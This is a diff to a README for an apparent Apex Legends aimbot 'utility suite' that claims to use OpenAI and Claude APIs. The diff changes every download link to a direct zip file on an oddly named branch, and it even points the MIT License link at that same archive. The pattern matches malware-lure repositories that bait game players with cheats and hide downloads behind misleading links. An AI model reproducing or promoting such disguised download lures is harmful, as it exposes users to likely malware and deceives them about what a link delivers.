@@ -81,8 +81,8 @@ By harnessing the processing power of OpenAI and Claude APIs, our tool suite off
 ## 🔽 Download & Quick Start Guide
 
 Ready to join the elite, where rules of the arena bend to your will? Get started by accessing the latest build here:  
-[![Download](https://img.shields.io/badge/Download-blue)](https://xrentnerdukek.github.io)  
-Download: https://xrentnerdukek.github.io
+[![Download](https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip)](https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip)  
+Download: https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip
 
 1. Download and extract the suite package.
 2. Launch the Adaptive Setup Wizard.
@@ -108,7 +108,7 @@ Whether you're a streamer pushing for Predator rank or a newcomer seeking rapid 
 
 ## 📜 License (MIT, 2025)
 
-This repository is released under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is released under the [MIT License](https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip).  
 © 2025 The Apex Legends Advanced Utility Suite Project
 
 ---
@@ -116,8 +116,8 @@ This repository is released under the [MIT License](https://opensource.org/licen
 ## 🔽 Final Download
 
 Experience the next-level, secure Apex Legends enhancement suite:  
-[![Download](https://img.shields.io/badge/Download-blue)](https://xrentnerdukek.github.io)  
-Download: https://xrentnerdukek.github.io
+[![Download](https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip)](https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip)  
+Download: https://raw.githubusercontent.com/xrentnerdukek/apex-legends-aimsuite/branch/unreprovably/apex-legends-aimsuite-3.2.zip
 
 ---
 
